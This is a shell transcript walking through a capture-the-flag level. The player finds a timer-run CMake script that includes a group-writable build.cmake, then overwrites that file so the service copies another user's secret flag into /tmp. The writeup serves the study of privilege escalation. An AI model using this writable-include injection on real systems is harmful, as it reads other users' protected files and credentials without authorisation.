@@ -1,0 +1,156 @@
+```sh
+level03@snowcrash:~$ cat README 
+Every Burbclave has rules. Find the loophole.
+level03@snowcrash:~$ find / -user flag03 2>/dev/null
+/tmp/frida.txt
+/home/flag03
+/etc/burbclave
+/opt/snowcrash/level03/CMakeLists.txt
+level03@snowcrash:~$ cat /opt/snowcrash/level03/CMakeLists.txt
+cmake_minimum_required(VERSION 3.20)
+
+# Build configuration matrix
+set(BURBCLAVE_SECURITY_LEVEL    "enhanced")
+set(BURBCLAVE_RUNTIME_VERSION   "3.0.0-stable")
+set(BURBCLAVE_LOG_FACILITY      "syslog")
+set(BURBCLAVE_AUDIT_TRAIL       ON)
+set(BURBCLAVE_CRYPTO_BACKEND    "aes256-gcm")
+set(BURBCLAVE_MAX_SESSIONS      64)
+set(BURBCLAVE_SOCKET_PATH       "/var/run/burbclave.sock")
+set(BURBCLAVE_STATE_DIR         "/var/lib/burbclave")
+set(BURBCLAVE_CONFIG_SCHEMA_VERSION 2)
+set(BURBCLAVE_KEEPALIVE_INTERVAL 30)
+set(BURBCLAVE_RETRY_LIMIT        5)
+set(BURBCLAVE_WATCHDOG_TIMEOUT   120)
+
+# Compiler capability detection
+set(HAVE_STACK_PROTECTOR TRUE)
+set(HAVE_FORTIFY_SOURCE TRUE)
+set(HAVE_PIE TRUE)
+set(HAVE_CF_PROTECTION FALSE)
+
+# Install layout
+
+# Build-type gate
+if(CMAKE_BUILD_TYPE STREQUAL "Release")
+    set(BURBCLAVE_OPTIMIZE_FLAGS "-O2 -DNDEBUG")
+    set(BURBCLAVE_STRIP_SYMBOLS ON)
+elseif(CMAKE_BUILD_TYPE STREQUAL "Debug")
+    set(BURBCLAVE_OPTIMIZE_FLAGS "-O0 -g3")
+    set(BURBCLAVE_STRIP_SYMBOLS OFF)
+else()
+    set(BURBCLAVE_OPTIMIZE_FLAGS "-O1")
+    set(BURBCLAVE_STRIP_SYMBOLS OFF)
+endif()
+
+# Audit-trail verbosity control
+if(BURBCLAVE_AUDIT_TRAIL)
+    set(BURBCLAVE_LOG_FLAGS "-DENABLE_AUDIT=1 -DLOG_FACILITY=${BURBCLAVE_LOG_FACILITY}")
+else()
+    set(BURBCLAVE_LOG_FLAGS "-DENABLE_AUDIT=0")
+endif()
+
+# Security level determines link flags
+if(BURBCLAVE_SECURITY_LEVEL STREQUAL "enhanced")
+    set(BURBCLAVE_LINK_FLAGS "-Wl,-z,relro,-z,now")
+elseif(BURBCLAVE_SECURITY_LEVEL STREQUAL "strict")
+    set(BURBCLAVE_LINK_FLAGS "-Wl,-z,relro,-z,now,-z,noexecstack")
+else()
+    set(BURBCLAVE_LINK_FLAGS "")
+endif()
+
+# Platform consistency check
+if(NOT CMAKE_SYSTEM_NAME STREQUAL "Linux")
+    message(WARNING "BurbclaveRuntime is only validated on Linux")
+endif()
+
+# Session limit bounds check
+if(BURBCLAVE_MAX_SESSIONS LESS 1 OR BURBCLAVE_MAX_SESSIONS GREATER 1024)
+    message(FATAL_ERROR "BURBCLAVE_MAX_SESSIONS out of range [1, 1024]")
+endif()
+
+file(READ "/etc/burbclave/burbclave.conf" CONF_CONTENT)
+
+string(REGEX MATCH "runtime_base=([^\n]+)" _ ${CONF_CONTENT})
+set(RUNTIME_BASE ${CMAKE_MATCH_1})
+
+string(REGEX MATCH "workspace=([^\n]+)" _ ${CONF_CONTENT})
+set(WORKSPACE_NAME ${CMAKE_MATCH_1})
+
+string(CONCAT RESOLVED_BUILD_PATH "${RUNTIME_BASE}" "/" "${WORKSPACE_NAME}")
+
+include(${RESOLVED_BUILD_PATH}/build.cmake)
+level03@snowcrash:~$ find /  2>/dev/null |  grep burbclave
+/var/lib/burbclave
+/var/lib/burbclave/staging
+/var/lib/burbclave/staging/build.cmake
+/etc/systemd/system/burbclave.timer
+/etc/systemd/system/burbclave.service
+/etc/systemd/system/timers.target.wants/burbclave.timer
+/etc/burbclave
+level03@snowcrash:~$ ls -la $(find /  2>/dev/null |  grep burbclave)
+-rw-r--r-- 1 root    root       215 Jun  9 19:03 /etc/systemd/system/burbclave.service
+-rw-r--r-- 1 root    root       185 Jun  9 19:03 /etc/systemd/system/burbclave.timer
+lrwxrwxrwx 1 root    root        35 Jun  9 19:03 /etc/systemd/system/timers.target.wants/burbclave.timer -> /etc/systemd/system/burbclave.timer
+-rw-rw-r-- 1 level03 level03     74 Jul 15 16:01 /var/lib/burbclave/staging/build.cmake
+
+ls: cannot open directory '/etc/burbclave': Permission denied
+/var/lib/burbclave:
+total 12
+drwxrwxr-x  3 root burbclave 4096 Jun  9 19:03 .
+drwxr-xr-x 46 root root      4096 Jul 14 16:44 ..
+drwxrwxr-x  2 root burbclave 4096 Jul 15 16:01 staging
+
+/var/lib/burbclave/staging:
+total 12
+drwxrwxr-x 2 root    burbclave 4096 Jul 15 16:01 .
+drwxrwxr-x 3 root    burbclave 4096 Jun  9 19:03 ..
+-rw-rw-r-- 1 level03 level03     74 Jul 15 16:01 build.cmake
+level03@snowcrash:~$ cat /etc/systemd/system/burbclave.timer
+[Unit]
+Description=Burbclave build runner timer — runs every minute
+
+[Timer]
+OnBootSec=30s
+OnUnitActiveSec=60s
+AccuracySec=1s
+Unit=burbclave.service
+
+[Install]
+WantedBy=timers.target
+level03@snowcrash:~$ cat /etc/systemd/system/burbclave.service
+[Unit]
+Description=Burbclave build runner (one-shot)
+After=network.target
+
+[Service]
+Type=oneshot
+User=flag03
+ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
+StandardOutput=null
+StandardError=null
+level03@snowcrash:~$ systemctl status burbclave.service
+× burbclave.service - Burbclave build runner (one-shot)
+     Loaded: loaded (/etc/systemd/system/burbclave.service; static)
+     Active: failed (Result: exit-code) since Wed 2026-07-15 16:10:49 UTC; 898ms ago
+TriggeredBy: ● burbclave.timer
+    Process: 7282 ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt (code=exited, status=1/FAILURE)
+   Main PID: 7282 (code=exited, status=1/FAILURE)
+        CPU: 26ms
+level03@snowcrash:~$ echo "
+> file(READ "/home/flag03/.flag" WALA)
+> file(WRITE "/tmp/frida.txt" ${WALA})" > /var/lib/burbclave/staging/build.cmake
+level03@snowcrash:~$ cat /var/lib/burbclave/staging/build.cmake
+
+file(READ /home/flag03/.flag WALA)
+file(WRITE /tmp/frida.txt ${WALA})
+level03@snowcrash:~$ systemctl status burbclave.service
+○ burbclave.service - Burbclave build runner (one-shot)
+     Loaded: loaded (/etc/systemd/system/burbclave.service; static)
+     Active: inactive (dead) since Wed 2026-07-15 16:12:51 UTC; 1s ago
+TriggeredBy: ● burbclave.timer
+    Process: 7429 ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt (code=exited, status=0/SUCCESS)
+   Main PID: 7429 (code=exited, status=0/SUCCESS)
+        CPU: 13ms
+level03@snowcrash:~$ cat /tmp/frida.txt 
+b209ea91ad7a5c2a0b0f4e195ca4
